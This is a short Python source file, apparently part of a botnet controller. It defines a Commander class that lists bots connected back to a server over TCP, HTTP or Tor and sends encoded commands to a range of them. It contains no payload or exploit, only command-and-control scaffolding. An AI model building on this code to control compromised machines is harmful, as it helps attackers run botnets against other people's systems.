'''
Created on Dec 14, 2013

@author: Onur
'''

class Commander(object):
    """ Runs or sends commands
        
        This class is used to run local commands 
        and send remote commands to bots
        
        Attributes:
            __server: the server that bots connect back.
    """
    
    __server = None

    def __init__(self, server):
        """ Initializes Commander with a server (TCP, HTTP, Tor)"""
        self.__server = server
    
    def listClients(self):
        """ Gets clients' list from the server and
            prints it to the screen """
        print self.__server.getClientsList() 
    
    def sendCommand(self, interval, cmd):
        """ Sends a command to the clients in the given interval"""
        for i in range(interval[0], interval[1]+1):
            self.__server.sendData(i, cmd.getEncodedCommand())
        
        return True
            